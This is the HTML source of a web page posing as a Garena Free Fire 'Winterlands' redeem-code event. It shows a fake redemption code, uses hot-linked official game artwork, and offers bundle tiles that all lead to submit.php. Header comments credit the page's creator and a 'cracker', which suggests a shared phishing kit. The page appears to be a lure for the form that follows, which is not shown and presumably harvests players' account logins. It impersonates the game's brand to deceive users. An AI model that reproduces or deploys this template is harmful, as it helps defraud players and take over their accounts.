<!--- CREATED BY AHMAD ABDUL MALIK --->
<!--- CRACKED BY RAFLIPEDIA --->
<!--- REPAIR RESULT BY RAFLIPEDIA --->
<!--- CREATED AT 10 SEPTEMBER 2017 at 11:18 AM --->
<!--- PLEASE DONT CHANGE THIS COPYRIGHT. APPRECIATE ME! --->

<html>
<head>
<title>Free Fire Winterlands - Redeem Code</title>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Free Fire Winterlands - Redeem Code"/>
<meta property="og:url" content="index.html"/>
<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
<meta property="og:type" content="article"/>
<meta property="article:author" content="https://www.facebook.com/MobileLegendsGameIndonesia"/>
<meta property="og:image" content="img/banner.jpg"/>
<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/index.css"/>
</head>
<body>
<div class="logo">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" alt="Free Fire Winterlands"/>
</div>
<img class="banner" src="https://oketekno.com/wp-content/uploads/2018/10/Caroline-Free-Fire.jpg" alt="Banner"/>
<div style="clear:both"></div>
<div class="herohead">
<center><font style="font-size:14px;color:#64ffda;">Redemption Code</font></center><br/>
<input class="code" value="BHDO K6UM SGMQ O6AS" readonly=""/>
<div class="title"><b>MONTHLY EVENT</b> | COPY REDEEM CODE</div>
<a href="submit.php" class="avatar" title="Alpha">
<img src="css/uhu/x/fotouhu/uhuinfo-foto13.png" alt="BUNDLE"/>
<small>BUNDLE<br/>New Years</small>
</a>
<a href="submit.php" class="avatar" title="Alpha">
<img src="css/uhu/x/fotouhu/uhuinfo-foto6.png" alt="BUNDLE"/>
<small>BUNDLE<br/>Winterlands</small>
</a>
<a href="submit.php" class="avatar" title="Estes">
<img src="css/uhu/x/fotouhu/uhuinfo-foto7.png" alt="BUNDLE"/>
<small>BUNDLE<br/>Winter Elk</small>
</a>
<a href="submit.php" class="avatar" title="Miya">
<img src="css/uhu/x/fotouhu/uhuinfo-foto8.png" alt="SET"/>
<small>SET<br/>Grumpy old</small>
</a>
</div>
<ul class="news">
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_AR_orange.png)" alt="M4A1">M4A1<br/><small>A balanced rifle is suitable for all types of battles.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SMG_orange.png)" alt="MP5">MP5<br/><small>Beyond other machine guns in terms of stability, but less effective for long distances.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SG_orange.png)" alt="M1014">M1014<br/><small>Use the shotgun to destroy melee enemies quickly.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_SR_orange.png)" alt="AWM">AWM<br/><small>High strength sniper rifle with long reload time.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_Pistol_orange.png)" alt="USP">USP<br/><small>A light gun that does not affect the user's agility.</small></li>
<li style="background-image:url(css/uhu/x/uhuinfo99/Icon_Melee_orange.png)" alt="PAN">PAN<br/><small>Great shield that protects users from anything your enemy can use.</small></li>
</ul>
</body>

</html>